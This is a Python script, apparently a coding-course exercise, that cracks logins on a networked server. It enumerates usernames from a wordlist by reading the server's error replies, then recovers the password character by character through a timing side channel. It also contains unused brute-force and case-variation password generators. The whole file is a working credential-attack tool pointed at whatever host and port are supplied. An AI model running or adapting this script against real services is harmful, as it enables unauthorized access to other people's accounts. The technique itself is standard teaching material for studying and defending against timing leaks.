import socket
import sys
import itertools
import string
import os
import json
from datetime import datetime


class Hacker:
    def __init__(self, hostname, port):
        self.hostname = hostname
        self.port = port
        self.poss_chars = string.ascii_letters + string.digits
        self.wrong_password = '{"result": "Wrong password!"}'
        self.wrong_login = '{"result": "Wrong login!"}'
        self.exception_happened = '{"result": "Exception happened during login"}'
        self.success = '{"result": "Connection success!"}'

    # generator yields every combination of upper and lower cases for a word
    @staticmethod
    def case_variations(word):
        letters = ((letter.upper(), letter.lower()) for letter in word)
        for guess in itertools.product(*letters):
            yield ''.join(guess)

    # generator yields every possible password up to length 20
    def brute_force(self):
        for pass_len in range(1, 20):
            for pass_attempt in itertools.product(self.poss_chars, repeat=pass_len):
                pass_attempt = ''.join(pass_attempt)
                yield ''.join(pass_attempt)

    # creates JSON login from login and password str's
    @staticmethod
    def login_password_json(login, password):
        combo = {
            "login": login,
            "password": password
        }
        json_combo = json.dumps(combo, indent=4)
        return json_combo

    @staticmethod
    def send_receive(message, sender_socket):
        sender_socket.send(message.encode())
        response = sender_socket.recv(1024)
        return response.decode()

    def run(self):
        # create socket
        with socket.socket() as client_socket:
            address = (self.hostname, self.port)
            client_socket.connect(address)
            # test every login
            with open('hacking/logins.txt', 'r') as all_logins:
                for line in all_logins:
                    login = line.strip()
                    message = self.login_password_json(login, ' ')
                    response = self.send_receive(message, client_socket)
                    if response == self.wrong_password:
                        password = ''
                        while True:
                            # record length of short response (when wrong password)
                            start = datetime.now()
                            response = self.send_receive(message, client_socket)
                            finish = datetime.now()
                            short_response_time = finish - start
                            for i in range(len(self.poss_chars)):
                                password += self.poss_chars[i]
                                message = self.login_password_json(login, password)
                                start = datetime.now()
                                response = self.send_receive(message, client_socket)
                                finish = datetime.now()
                                # if response time is > 100 * short response, exception is being handled at server. Append character
                                if (finish - start) > short_response_time * 100:
                                    pass
                                elif response == self.success:
                                    return self.login_password_json(login, password)
                                else:
                                    password = password[:-1]


# obtain hostname and port from command line
hostname = sys.argv[1]
port = int(sys.argv[2])
hacker = Hacker(hostname, port)
print(hacker.run())
